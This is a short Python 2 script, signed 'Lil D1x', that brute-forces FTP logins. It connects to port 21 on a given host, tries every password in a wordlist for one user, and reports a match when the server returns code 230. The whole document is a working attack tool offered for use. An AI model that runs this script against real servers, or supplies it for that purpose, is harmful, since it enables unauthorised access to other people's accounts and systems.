#!/usr/bin/python
import socket
import re
import sys

if len(sys.argv) != 4:
	print "BRUTE FORCE FTP - Lil D1x"
	print "Use Python ftpcowboy.py 127.0.0.1 user wordlist.txt"
	sys.exit(0)
user = sys.argv[2]

file = open(sys.argv[3])
for line in file.readlines():

	print "Testing with %s:%s "%(user,line)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect ((sys.argv[1],21))
	s.recv(1024)
	s.send("USER "+user+"\r\n")
	s.recv(1024)
	s.send("PASS "+line+"\r\n")
	result = s.recv(1024)
	s.send("Quit\r\n")

	if re.search("230",result):
		print "[+] == PASSWORD FOUND == %s[+]"%(line)
		break
	else:
		print "[-] Access Denied [-]\n"
